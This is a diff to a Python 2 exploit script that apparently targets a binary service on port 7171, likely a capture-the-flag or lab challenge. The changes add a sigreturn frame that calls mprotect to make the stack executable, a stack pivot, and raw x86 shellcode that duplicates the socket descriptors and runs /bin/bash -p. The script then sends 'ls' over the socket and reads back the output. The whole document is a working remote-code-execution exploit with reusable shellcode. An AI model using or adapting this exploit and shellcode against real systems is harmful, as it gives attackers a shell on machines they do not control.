@@ -15,6 +15,10 @@ INT_80        = 0x08056650
 POP_ESP_RET   = 0x0804e25f
 MOV_ESP_ECX   = 0x080c2812
 SUB_ESP_128   = 0x0805ba31
+JUST_EXIT     = 0x0805477b
+
+SYS_MPROTECT  = 125
+SYS_SIGRETURN = 119
 
 def recv_n_bytes(sock, n):
     c = 0
@@ -26,40 +30,44 @@ def recv_n_bytes(sock, n):
 
 s = create_connection((ip, 7171))
 buffer_address = recv_n_bytes(s, 4)
-print repr(buffer_address)
 buffer_address = struct.unpack("<I", buffer_address)[0]
-print hex(buffer_address)
+print "[+] Buffer address is", hex(buffer_address)
 
 page = recv_n_bytes(s, 4)
-print repr(page)
 page = struct.unpack("<I", page)[0]
-print hex(page)
-
+print "[+] mmap'd page address is", hex(page)
 
 sploit = ""
 sploit += struct.pack("<I", SIGRETURN_IND)
-frame = SigreturnFrame(sane=False, nulls_allowed=True)
+frame = SigreturnFrame(INT_80, arch="x86")
 
-frame.set_regvalue("eax", 125)
-frame.set_regvalue("ebx", buffer_address)
-frame.set_regvalue("ecx", 4096)
+# Frame that tries to call mprotect
+frame.set_regvalue("eax", SYS_MPROTECT)
+frame.set_regvalue("ebx", 0xbffff000)
+frame.set_regvalue("ecx", 0x10000)
 frame.set_regvalue("edx", 0x7)
+frame.set_regvalue("ebp", 0xbffdf000)
 frame.set_regvalue("eip", INT_80)
-frame.set_regvalue("esp", POP_ESP_RET)
+frame.set_regvalue("esp", buffer_address + 84)
+frame.set_regvalue("cs", 0x73)
+frame.set_regvalue("ss", 0x7b)
 
 sploit += frame.get_frame()
-print len(frame.get_frame())
+sploit += struct.pack("<I", buffer_address + 88)
+sploit += "\x6a\x02\x59\x31\xdb\x43\x43\x43\x43\x31\xc0\xb0\x3f\xcd\x80\x49\x79\xf7"
+sploit += "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
 
-#sploit += "A" * 4 * 17
-offset = len(sploit)
-print ">>>", offset
-sploit += "/bin//sh"
-sploit += struct.pack("<I", 0x0)
-
+# fIll up the rest of the buffer with NOPS
 sploit += "\x90" * (0x208 - len(sploit))
-sploit += "B" * 4
-sploit += struct.pack("<I", POP_ESP_RET)
-sploit += struct.pack("<I", buffer_address)
+sploit += "B" * 4                             # EBP
+sploit += struct.pack("<I", POP_ESP_RET)      # Pivot stack to start of buffer
+sploit += struct.pack("<I", buffer_address)   # Buffer address
 
-print ">>>", len(sploit)
+print "[+] Total length of sploit is", len(sploit)
 s.send(sploit)
+
+print "[+] Sending command to execute"
+s.send("ls\n")
+
+print "[+] Receiving command output"
+print repr(s.recv(1024))
